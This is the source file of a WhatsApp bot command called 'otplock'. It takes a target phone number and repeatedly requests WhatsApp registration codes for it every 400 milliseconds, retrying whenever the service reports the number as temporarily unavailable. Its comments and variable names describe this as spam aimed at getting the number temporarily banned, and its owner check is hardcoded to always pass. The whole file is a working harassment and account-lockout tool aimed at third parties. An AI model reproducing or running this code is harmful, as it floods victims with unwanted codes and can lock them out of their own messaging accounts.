const fs = require('fs');
const path = require('path');
const pino = require('pino'); // Logging library
const smd = require ('../lib');
smd({
  pattern: 'otplock',
  alias: ["requestOtp"],
  desc: "Request OTP code for the specified number multiple times",
  type: "whatsapp"
}, async (message, _0xc4c33d) => {
  try {
    const isCreator = true; // Change this based on your ownership logic

    // Check if user is the creator
    if (!isCreator) {
      return await message.reply("This command is only for the owner.");
    }

    // Check if input is provided
    if (!_0xc4c33d) {
      return await message.reply(`Example: .otplock countryCode|number`);
    }

    // Validate input format
    if (!/\|/.test(_0xc4c33d)) {
      return await message.reply(`Invalid format! Use: .otplock countryCode|number`);
    }

    // Read existing numbers from the JSON file
    let numbers = {};
    const tempBanPath = path.join(__dirname, './lib/tempban/ban.json');
    if (fs.existsSync(tempBanPath)) {
      numbers = JSON.parse(fs.readFileSync(tempBanPath));
    }

    const [cCode, number] = _0xc4c33d.split("|").map(part => part.trim());
    const fullNo = `${cCode}${number}`;
    
    await message.reply(`*OTP requests will be sent for ${fullNo}.*`);

    // Log OTP request activation
    console.log(`OTP requests activated for: +${fullNo}`);
    
    // Set up multi-file auth state
    const { state } = await useMultiFileAuthState('tempban');
    const spamSocket = makeWASocket({
      auth: state,
      mobile: true,
      logger: pino({ level: 'silent' })
    });

    // Function to request OTP
    const dropNumber = async () => {
      try {
        const res = await spamSocket.requestRegistrationCode({
          phoneNumber: `+${fullNo}`,
          phoneNumberCountryCode: cCode,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724, // Adjust this if needed
        });

        // Handle responses
        if (res.reason === 'temporarily_unavailable') {
          console.log(`Number temporarily unavailable: +${res.login}`);
          await sleep(100); // Wait before retrying
          await dropNumber(); // Retry
        } else {
          console.log(`OTP request sent to: +${fullNo}`);
        }
      } catch (error) {
        console.error(`Error requesting OTP for ${fullNo}:`, error);
      }
    };

    // Store the number in JSON and start the spam requests
    numbers[fullNo] = { cCode, number };
    fs.writeFileSync(tempBanPath, JSON.stringify(numbers, null, 2));

    // Set an interval for sending OTP requests
    const requestInterval = setInterval(() => {
      dropNumber();
    }, 400); // Adjust timing as necessary

    // Stop the requests after a certain duration if desired
    setTimeout(() => {
      clearInterval(requestInterval);
      message.reply(`*Stopped sending OTP requests for ${fullNo}.*`);
    }, 10000); // Stop after 10 seconds; adjust as necessary

  } catch (error) {
    await message.error(`Error: ${error.message}\n\nCommand: otpl`, error);
  }
});
